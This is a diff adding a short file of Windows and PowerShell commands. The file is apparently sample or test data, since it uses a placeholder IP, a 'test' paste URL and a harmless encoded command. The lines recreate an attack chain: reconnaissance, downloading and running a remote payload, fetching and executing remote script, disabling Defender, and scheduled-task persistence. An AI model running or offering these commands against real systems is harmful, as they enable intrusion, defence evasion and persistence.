@@ -1,0 +1,7 @@
+whoami
+ipconfig /all
+Invoke-WebRequest http://198.51.100.24/payload.exe -OutFile C:\Users\alex\Downloads\payload.exe
+powershell -NoP -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==
+IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/test')
+Set-MpPreference -DisableRealtimeMonitoring $true
+schtasks /Create /TN Update /TR C:\Users\alex\AppData\Local\Temp\runme.ps1
